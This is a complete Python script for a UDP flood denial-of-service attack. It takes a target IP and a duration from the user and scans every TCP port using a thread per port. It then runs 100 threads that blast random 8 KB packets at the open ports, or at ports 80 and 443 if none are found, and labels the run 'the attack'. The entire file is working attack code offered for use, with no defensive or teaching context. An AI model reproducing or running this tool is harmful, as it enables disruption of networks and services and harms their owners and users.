import socket
import random
import time
import threading
import os
import subprocess
import platform
from queue import Queue

def scan_ports(ip, max_ports=65535):
    open_ports = Queue()

    def check_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.1)
                if sock.connect_ex((ip, port)) == 0:
                    open_ports.put(port)
        except Exception as e:
            pass

    threads = []
    for port in range(1, max_ports + 1):
        thread = threading.Thread(target=check_port, args=(port,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    return list(open_ports.queue)

def get_mtu():
    os_type = platform.system()

    try:
        if os_type == "Darwin":
            result = subprocess.check_output(["ifconfig", "en0"]).decode()
            for line in result.splitlines():
                if "mtu" in line:
                    mtu = int(line.split("mtu")[1].strip())
                    return mtu

        elif os_type == "Windows":
            result = subprocess.check_output(["netsh", "interface", "ipv4", "show", "subinterface"]).decode()
            for line in result.splitlines():
                if "Wi-Fi" in line:
                    mtu = int(line.split()[2])
                    return mtu

        elif os_type == "Linux":
            result = subprocess.check_output(["ifconfig", "wlan0"]).decode()
            for line in result.splitlines():
                if "MTU" in line:
                    mtu = int(line.split("MTU:")[1].split()[0])
                    return mtu

    except subprocess.CalledProcessError as e:
        pass

    return None

def flood_target(ip, ports, total_time):
    end_time = time.time() + total_time
    message_size = 8192
    message = random._urandom(message_size)
    
    def send_packets():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            large_buffer_size = 1024 * 1024 * 1024
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, large_buffer_size)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, large_buffer_size)
            except socket.error as e:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 1024 * 256)  # 256 MB buffer
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 256)

            while time.time() < end_time:
                for port in ports:
                    try:
                        sock.sendto(message, (ip, port))
                    except socket.error:
                        time.sleep(0.001)
                        continue
        except Exception as e:
            pass
        finally:
            sock.close()
    
    threads = []
    for _ in range(100):
        thread = threading.Thread(target=send_packets)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    os.system("clear")
    print("Enter target IP:")
    target_ip = input().strip()

    os.system("clear")
    print("How long in seconds?")
    try:
        total_time = int(input().strip())
    except ValueError:
        print("Invalid input. Please enter a valid number.")
        exit()

    os.system("clear")
    print("Scanning ports...")
    try:
        target_ports = scan_ports(target_ip)
    except Exception as e:
        print(f"Error scanning ports: {e}")
        exit()

    os.system("clear")
    if not target_ports:
        print("No open ports found. Using default ports 80 and 443.")
        target_ports = [80, 443]
    else:
        print(f"Open ports found: {target_ports}")

    mtu = get_mtu()
    if mtu:
        print(f"Maximum Transmission Unit (MTU) for Wi-Fi: {mtu} bytes")
    else:
        print("Could not determine MTU size for Wi-Fi interface.")

    input("\nPress Enter to start the attack...")
    os.system("clear")
    print("Attack running...")

    try:
        flood_target(target_ip, target_ports, total_time)
    except KeyboardInterrupt:
        print("\nOperation interrupted by user.")
    except Exception as e:
        print(f"An error occurred during the attack: {e}")